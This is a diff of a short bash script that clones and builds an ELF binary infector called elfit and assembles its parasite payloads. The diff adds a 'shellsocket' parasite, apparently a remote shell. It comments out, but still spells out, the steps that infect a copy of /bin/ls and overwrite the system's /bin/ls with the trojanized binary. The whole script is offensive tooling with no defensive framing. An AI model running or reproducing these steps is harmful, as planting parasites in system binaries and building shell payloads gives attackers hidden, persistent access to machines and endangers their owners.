@@ -1,13 +1,14 @@
 #!/bin/bash
+cd /tmp
 git clone https://github.com/NickStephens/elfit
 cd elfit
 make
-cp /bin/ls .
 cd parasites
 nasm evil.asm
+nasm shellsocket.asm
 cd ..
-./elfit -p parasites/evil -t -e ls > output
-chmod go-rw output
-cp output /tmp
-mv ls /bin/ls
+#./elfit -p parasites/evil -t -e ls > output
+#chmod go-rw output
+#cp output /tmp
+#mv ls /bin/ls
 
